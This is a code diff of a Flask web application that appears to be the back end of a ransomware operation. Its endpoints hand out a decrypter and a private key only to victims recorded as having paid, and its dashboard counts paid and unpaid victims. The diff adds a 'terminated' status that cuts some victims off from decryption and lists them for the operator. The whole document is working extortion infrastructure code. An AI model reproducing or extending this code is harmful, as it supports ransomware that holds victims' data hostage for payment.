@@ -107,7 +107,7 @@ def status(uid):
     try:
         uid = clean(uid)
         user = Users.query.filter_by(uid=uid).first()
-        if not (uid and user):
+        if not uid or user.terminated:
             return jsonify({"error": "Invalid UID or UID doesn't exist."}), 403
 
     except Exception as e:
@@ -151,8 +151,8 @@ def download_decrypter(uid):
             return jsonify({"error": "Invalid UID."}), 403
 
         user = Users.query.filter_by(uid=uid).first()
-        if not user or not user.status:
-            return jsonify({"error": "UID doesn't exist or not a paid user."}), 403
+        if not user or user.terminated or not user.status:
+            return jsonify({"error": "UID doesn't exist or user terminated."}), 403
 
         script = Decrypter.query.first()
         if script:
@@ -175,7 +175,7 @@ def download_private_key(uid):
             return jsonify({"error": "Invalid UID."}), 403
 
         user = Users.query.filter_by(uid=uid, status=True).first()
-        if not user:
+        if not user or user.terminated or not user.status:
             return jsonify({"error": "Invalid UID or payment wasn't made."}), 403
 
         response = make_response(user.private_key)
@@ -240,6 +240,7 @@ def dashboard():
 def databases():
     users = Users.query.filter_by(status=False).all()
     users_paid = Users.query.filter_by(status=True).all()
+    terminated = Users.query.filter_by(terminated=True).all()
 
     # Get counts and latest entry date for users
     users_count = len(users)
@@ -263,7 +264,8 @@ def databases():
         users_count=users_count,
         last_user_date=last_user_date,
         users_paid_count=users_paid_count,
-        last_user_paid_date=last_user_paid_date
+        last_user_paid_date=last_user_paid_date,
+        terminated_users=terminated
     )
 
 
